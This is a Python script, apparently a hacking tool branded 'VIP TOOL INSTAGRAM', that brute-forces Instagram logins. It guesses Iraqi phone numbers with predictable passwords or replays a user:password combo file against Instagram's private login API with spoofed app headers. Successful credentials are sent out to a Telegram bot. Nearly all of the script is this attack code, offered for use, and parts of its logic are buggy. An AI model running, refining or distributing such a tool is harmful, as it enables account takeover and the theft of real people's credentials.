
import os , sys
from time import sleep
import random
import requests
from uuid import uuid4


def close():
    input('')
    sys.exit()
l = '\033[91m'
h = 0
b = 0
s = 0
block = 0

logo = l+"""
\033[96;1m
                                              
V҈I҈P҈ T҈O҈O҈L҈ I̥ͦN̥ͦS̥ͦT̥ͦḀͦG̥ͦR̥ͦḀͦM̥ͦ                                    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[31;1m > C̺͆H̺͆A̺͆N̺͆N̺͆E̺͆L̺͆:̺͆ kurdhack

\033[31;1m > I͎N͎S͎T͎A͎G͎R͎A͎M͎ dark
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""
tele = input("\033[33;1m h͎a͎l͎b͎z͎h͎e͎r͎a͎ N/Y: ")
os.system('clear')
if "Y" in tele:
    id = input("\033[33;1mi͟d͟ t͟e͟l͟e͟ ͟gr͟a͟m͟ ✔︎☺︎︎☻︎: ")
    bot = input("\033[33;1mt͟o͟k͟e͟n͟ b͟o͟t͟ ✔︎☺︎︎☻︎: ")
elif "y" in tele:
    id = input("ID telegram : ")
    bot = input("TOKEN BOT : ")
    
print(logo)
danial  = input("""| 1 | =  N҉U҉M҉B҉E҉R҉ dark҉☻︎♥︎

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~danial~~~~
𝑅𝐴𝑄𝐴𝑀 1 dark | : """)
if danial  == "1":
   
    nmuna = '0123456789'
    os.system('clear')
    print(logo)
    print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩  : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')

    while True:
        fuck = str(''.join((random.choice(nmuna) for i in range(7))))
        user = '+964751' + fuck
        pasw = '0751' + fuck
        #print(f"\n{user} \n {pasw}")
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=h͎i͎t͎s͎: {user}:{pasw}")
            h += 1
            print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'challenge_required' or 'two' in log.text:
            s += 1
            print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        else:
            b+=1    
            print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')

elif danial  =="2":
    os.system('clear')
    print(logo)
    co = input("\033[1;91mCOMBO: ")
    if '.txt' in co:
        pass
    else:
        co  = co + '.txt'
   
    os.system('clear')
    print(logo)
    print(f"\r \033[32mGOODh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
    acc = open(co,"r").read().splitlines()
    for combo in acc:
        user = combo.split(":")[0]
        pasw = combo.split(":")[1]
        req = requests.session()
        log_head = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
        uid = str(uuid4())
        log_data = {
            'uuid': uid,
            'password': pasw,
            'username': user,
            'device_id': uid,
            'from_reg': 'false',
            '_csrftoken': 'missing',
            'login_attempt_countn': '0'}
        r = req.post('https://i.instagram.com/api/v1/accounts/login/', headers=log_head, data=log_data, allow_redirects=True)
        #print(r.text)
        if "logged_in_user" in r.text:
            if "Y" or "y" in tele:
                  t = requests.post(f"https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=h͎i͎t͎s͎: {user}:{pasw}")
         
            h += 1
            print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'check your username' or 'The password you entered is incorrect.' or "unusable_password" in log.text:
            b += 1
            print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'challenge_required' in log.text:
            s += 1
            print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'Please wait a few minutes' in log.text:
            block += 1
            print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        elif 'Bad request' in log.text:
            b += 1
            print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')
        else:
            b+=1    
            print(f"\r \033[32mh͎i͎t͎s͎: {h} \033[31;1m🇧 🇦 🇩 : {b} \033[33;1mCHECKPOINT: {s} \033[31;1mBLOCK: {block}",end='')

    

